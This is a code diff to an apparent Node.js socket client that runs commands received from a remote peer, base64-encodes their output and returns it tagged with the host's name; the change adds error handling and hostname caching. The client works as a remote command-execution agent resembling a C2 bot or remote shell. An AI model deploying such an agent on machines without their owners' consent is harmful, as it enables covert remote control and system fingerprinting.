@@ -10,6 +10,7 @@ var spawn = require('child_process').spawn;
 
 var sender_id;
 var receiver_id;
+var hostname;
 var baseSocket;
 var socketOpen = false;
 
@@ -86,25 +87,30 @@ var processCommand = function(cmd, cmdData) {
         var args = splitted;
         console.log(`args: ${args}`);
         if (args === firstElement) args = [];
-        childObject = spawn(firstElement, args, {
-            detached: true
-        });
-
-        childObject.stdout.setEncoding('utf8');
-        childObject.stdout.on('data', function(data) {
-            console.log('stdout: ' + data);
-            output = data;
-            var toSend = new Packet(sender_id, receiver_id, {
-                output: new Buffer(output).toString('base64')
+        try {
+            childObject = spawn(firstElement, args, {
+                detached: true
             });
-            send(toSend);
-        });
+
+            childObject.stdout.setEncoding('utf8');
+            childObject.stdout.on('data', function(data) {
+                console.log('stdout: ' + data);
+                output = data;
+                var toSend = new Packet(sender_id, receiver_id, {
+                    output: new Buffer(output).toString('base64'),
+                    name: hostname
+                });
+                send(toSend);
+            });
+        } catch (err) {
+            console.log("something went wrong");
+        }
     } else if (cmd === "sig") {
         childObject.kill();
     } else if (cmd === "ack") {
-
+        hostname = os.hostname();
         var toSend = new Packet(sender_id, receiver_id, {
-            name: os.hostname()
+            name: hostname
         });
         send(toSend);
     }
